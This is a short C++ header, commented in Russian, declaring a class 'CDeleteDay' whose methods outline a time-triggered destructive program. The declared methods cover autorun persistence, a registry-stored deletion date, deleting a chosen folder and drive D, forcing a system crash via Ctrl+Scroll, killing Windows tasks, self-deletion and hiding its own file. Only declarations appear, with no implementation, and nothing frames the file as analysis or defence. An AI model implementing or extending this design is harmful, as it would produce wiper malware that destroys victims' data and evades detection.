#pragma once
class CDeleteDay
{
private:
	CString m_strFilePath; //путь к нашему экзешнику
	//установить в конструкторе

public:
	CDeleteDay();
	~CDeleteDay();

	// //добавляем себя автозагрузку
	bool AddToAutoRun();
	// Проверить не наступил ли день выполнения задания
	bool InspectDeleteData();

	// записываем в реестр когда выполнится задача
	bool SaveDeleteDay(SYSTEMTIME SysTime);
	// записываем какую папку будем удалять
	bool SaveFolderPathToDelete(CString csFolderPath);	
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	void HideFile();
};

